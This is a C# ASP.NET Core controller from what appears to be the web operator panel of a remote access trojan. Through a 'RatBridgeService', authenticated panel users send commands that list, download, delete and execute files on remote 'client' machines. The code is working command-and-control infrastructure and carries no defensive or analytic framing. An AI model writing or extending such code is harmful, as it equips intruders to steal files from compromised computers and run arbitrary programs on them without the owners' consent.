using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using WebPanel.Models;
using WebPanel.Services;

namespace WebPanel.Controllers;

[ApiController]
[Route("api/[controller]")]
[Authorize]
public class FileManagerController : ControllerBase
{
    private readonly RatBridgeService _ratBridge;
    private readonly ILogger<FileManagerController> _logger;

    public FileManagerController(RatBridgeService ratBridge, ILogger<FileManagerController> logger)
    {
        _ratBridge = ratBridge;
        _logger = logger;
    }

    [HttpPost("{clientId}/list")]
    public async Task<ActionResult<CommandResponse>> ListFiles(string clientId, [FromBody] FileManagerRequest request)
    {
        var success = await _ratBridge.SendCommandToClientAsync(clientId, "filemanager_list", new Dictionary<string, object>
        {
            { "path", request.Path }
        });

        if (!success)
        {
            return StatusCode(500, new CommandResponse
            {
                Success = false,
                Message = "Failed to send command"
            });
        }

        return Ok(new CommandResponse
        {
            Success = true,
            Message = "List files command sent"
        });
    }

    [HttpPost("{clientId}/download")]
    public async Task<ActionResult<CommandResponse>> DownloadFile(string clientId, [FromBody] FileManagerRequest request)
    {
        var success = await _ratBridge.SendCommandToClientAsync(clientId, "filemanager_download", new Dictionary<string, object>
        {
            { "path", request.Path }
        });

        if (!success)
        {
            return StatusCode(500, new CommandResponse
            {
                Success = false,
                Message = "Failed to send download command"
            });
        }

        _logger.LogInformation("User {Username} downloading file {Path} from client {ClientId}",
            User.Identity?.Name, request.Path, clientId);

        return Ok(new CommandResponse
        {
            Success = true,
            Message = "Download started"
        });
    }

    [HttpPost("{clientId}/delete")]
    public async Task<ActionResult<CommandResponse>> DeleteFile(string clientId, [FromBody] FileManagerRequest request)
    {
        var success = await _ratBridge.SendCommandToClientAsync(clientId, "filemanager_delete", new Dictionary<string, object>
        {
            { "path", request.Path }
        });

        if (!success)
        {
            return StatusCode(500, new CommandResponse
            {
                Success = false,
                Message = "Failed to send delete command"
            });
        }

        _logger.LogWarning("User {Username} deleted file {Path} on client {ClientId}",
            User.Identity?.Name, request.Path, clientId);

        return Ok(new CommandResponse
        {
            Success = true,
            Message = "Delete command sent"
        });
    }

    [HttpPost("{clientId}/execute")]
    public async Task<ActionResult<CommandResponse>> ExecuteFile(string clientId, [FromBody] FileManagerRequest request)
    {
        var success = await _ratBridge.SendCommandToClientAsync(clientId, "filemanager_execute", new Dictionary<string, object>
        {
            { "path", request.Path }
        });

        if (!success)
        {
            return StatusCode(500, new CommandResponse
            {
                Success = false,
                Message = "Failed to send execute command"
            });
        }

        _logger.LogInformation("User {Username} executed file {Path} on client {ClientId}",
            User.Identity?.Name, request.Path, clientId);

        return Ok(new CommandResponse
        {
            Success = true,
            Message = "Execute command sent"
        });
    }
}
